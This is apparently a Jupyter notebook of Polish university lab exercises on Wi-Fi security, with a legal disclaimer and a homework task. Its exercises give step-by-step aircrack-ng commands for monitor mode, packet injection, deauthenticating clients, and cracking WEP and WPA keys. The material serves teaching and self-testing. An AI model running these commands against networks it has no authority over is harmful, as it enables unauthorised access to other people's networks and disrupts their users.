{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Bezpieczeństwo Systemów Komputerowych\n",
    "\n",
    "## Ćwiczenia 10: Zabezpieczenia sieci Wi-Fi\n",
    "\n",
    "### 14 maja 2018 roku"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Disclaimer\n",
    "\n",
    "Prezentowane treści mają charakter **edukacyjny**.\n",
    "\n",
    "Prezentacja pokazuje techniki testowania swojej sieci bezprzewodowej.\n",
    "\n",
    "Wykorzystanie tych technik do siedzi cudzych jest **zabronione**.\n",
    "\n",
    "Autor dokumentu nie bierze odpowiedzialności za to, w jakim celu wiedza przedstawiona w dokumencie zostanie wykorzystana.\n",
    "\n",
    "## Artykuł 267 Kodeksu Karnego\n",
    "\n",
    "\n",
    "> §1. Kto bez uprawnienia uzyskuje dostęp do informacji dla niego nieprzeznaczonej, otwierając zamknięte pismo, podłączając się do sieci telekomunikacyjnej lub przełamując albo omijając elektroniczne, magnetyczne, informatyczne lub inne szczególne jej zabezpieczenie, podlega grzywnie, karze ograniczenia wolności albo **pozbawienia wolności do lat 2**.  \n",
    "§ 2. Tej samej karze podlega, kto bez uprawnienia uzyskuje dostęp do całości lub części systemu informatycznego.  \n",
    "§ 3. Tej samej karze podlega, kto w celu uzyskania informacji, do której nie jest uprawniony, zakłada lub posługuje się urządzeniem podsłuchowym, wizualnym albo innym urządzeniem lub oprogramowaniem."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Uwaga\n",
    "\n",
    "Do przeprowadzenia ćwiczeń potrzebna jest specjalna karta sieciowa, która pozwala przejść w stan monitorowania."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Zadanie 1\n",
    "\n",
    "## Przełączenie karty w tryb monitorowania\n",
    "\n",
    "```bash\n",
    "> iwconfig\n",
    "> sudo ifconfig wlan0 up\n",
    "> sudo airmon-ng start wlan0\n",
    "> ifconfig wlan0mon\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Zadanie 2\n",
    "\n",
    "## Badanie sieci w pobliżu\n",
    "\n",
    "```bash\n",
    "> sudo airodump-ng wlan0mon\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Zadanie 3\n",
    "\n",
    "## Zmiana kanału\n",
    "\n",
    "```bash\n",
    "> sudo ifconfig wlan0mon down\n",
    "> sudo iwconfig wlan0mon channel 4\n",
    "> sudo iwconfig wlan0mon\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Zadanie 4\n",
    "\n",
    "## Wstrzykiwanie paczek\n",
    "\n",
    "```bash\n",
    "sudo airodump-ng mon0\n",
    "sudo iwconfig mon0 channel 4\n",
    "sudo aireplay-ng -9 -e ConnectEverybodyNow -a <MAC AP> mon0\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Zadanie 5\n",
    "\n",
    "## Łamanie zabezpieczeń WEP - sposób pierwszy\n",
    "\n",
    "- Najpierw sprawdzamy, czy ktoś jest podłączony do punktu dostępowego:\n",
    "```bash\n",
    "sudo airodump-ng -c 10 -a --bssid <MAC AP> wlan0mon\n",
    "```\n",
    "- Nasłuchujemy komunikację z wybranym AP i zapisujemy ją do pliku:\n",
    "```bash\n",
    "sudo airodump-ng wlan0mon -c 10 --bssid <MAC AP> -w wep_1\n",
    "```\n",
    "- Teraz czekamy, aż uprawniony użytkownik się zaloguje. Jeżeli nie chcemy czekać, możemy wysłać pakiet rozłączający klienta:\n",
    "```bash\n",
    "sudo aireplay-ng -0 5 -a <MAC AP> -c <MAC Klienta> wlan0mon\n",
    "```\n",
    "- po tym poleceniu należy sprawdzić, czy w pojawił się plik z rozszerzeniem xor - w tym pliku jest strumień klucza, który będzie nam teraz potrzebny do sfałoszowania uwierzytelnienia:\n",
    "```bash\n",
    "sudo aireplay-ng -1 0 -e HackingExercises -y wep_1*.xor -a <MAC AP> -h aa:bb:cc:dd:ee:ff wlan0mon\n",
    "```\n",
    "- okazuje się, że jesteśmy podłączeni do AP\n",
    "\n",
    "## Łamanie zabezpieczeń WEP - sposób drugi\n",
    "\n",
    "- Podobnie jak wcześniej nasłuchujemy pakiety wymieniane z wybranym AP i zapisujemy je do pliku:\n",
    "```bash\n",
    "sudo airodump-ng wlan0mon -c 10 --bssid <MAC AP> -w wep_2\n",
    "```\n",
    "- Widać, że przechwyconych pakietów jest mało (a potrzebujemy kilkadziesiąt tysięcy pakietów), trzeba proces przyspieszyć przez wstrzykiwanie pakietów ARP\n",
    "```bash\n",
    "sudo aireplay-ng -3 -b <MAC AP> -h <MAC Klienta> wlan0mon\n",
    "```\n",
    "- Gdy liczba przechwyconych paczek będzie rosła za wolno, można spróbować zdeautentykować użytkownika, po ponownym podłączeniu wszystko zacznie działać dużo szybciej\n",
    "- Po chwili okaże się, że możemy spróbować złamać hasło:\n",
    "```bash\n",
    "sudo aircrack-ng wep_2*.cap\n",
    "\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Zadanie 6\n",
    "\n",
    "## Łamanie zabezpieczeń WPA\n",
    "\n",
    "- Tak jak wcześniej zaczynamy od przechwytywania pakietów wymienianych z wybranym AP:\n",
    "```bash\n",
    "sudo airodump-ng wlan0mon -c 10 --bssid <MAC AP> -w wpa_1\n",
    "```\n",
    "- Teraz czekamy na wykonanie 4-way handshake. Możemy to przyspieszyć przez odłączenie użytkownika:\n",
    "```bash\n",
    "sudo aireplay-ng -0 5 -a <MAC AP> -c <MAC Klienta> wlan0mon\n",
    "```\n",
    "- W terminalu, w którym wyświetlają się informacje o przechwyconych pakietach powinna się pojawić informacja o przechwyconym uścisku dłoni. To oznacza, że już mogę przerwać przechwytywanie pakietów i próbować siłowo złamać hasło:\n",
    "```bash\n",
    "sudo aircrack-ng wpa_1-01.cap -w <plik ze słowami> \n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Praca domowa\n",
    "\n",
    "Do pracy domowej dołączony jest plik `cap`, w którym został zarejestrowany poczwórny uścisk dłoni. Twoim zadaniem jest przesłanie archiwum ZIP, w którym będą dwa pliki:\n",
    "- `psk.txt` - który będzie zawierał złamane hasło\n",
    "- `solution.txt` - który będzie zawierał opis, w jaki sposób hasło zostało złamane.\n",
    "SSID sieci, w której nastąpiło złamanie to `HackingExercises`.\n",
    "\n",
    "Oczywiście nazwa pliku ZIP ma jasno wskazywać na autora rozwiązania.\n",
    "\n",
    "Należy się oczywiście podpowiedź, jak hało zostało wygenerowane. Hasło zostało wygenerowane w taki sposób, że słowo składa się tylko z liter łacińskich (w sensie, że nie ma literki, która zawiera polskie znaki narodowe) i jest to prawidłowe słowo (w sensie `pawel` nie może być, bo nie jest to prawidłowe słowo w języku polskim). Pierwsza litera została zamieniona na wielką literę, a na końcu słowa dopisano jedną cyfrę dziesiętną."
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.5rc1"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
